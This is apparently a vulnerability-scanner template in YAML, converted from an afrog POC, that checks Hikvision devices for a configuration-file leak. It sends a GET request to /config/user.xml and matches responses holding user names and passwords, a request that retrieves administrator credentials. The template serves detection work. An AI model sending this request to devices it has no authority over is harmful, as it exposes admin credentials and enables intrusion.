# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - <user name=
          - password="
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/config/user.xml'
id: hikvision-info-leak
info:
  author: tangshoupu
  description: hikvision 存在目录浏览漏洞，攻击者可以通过访问/config/user.xml来获取hikvision设备的管理员账号密码等信息。
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: hikvision 配置文件泄露
  severity: high
  tags: hikvision,disclosure,argus-import
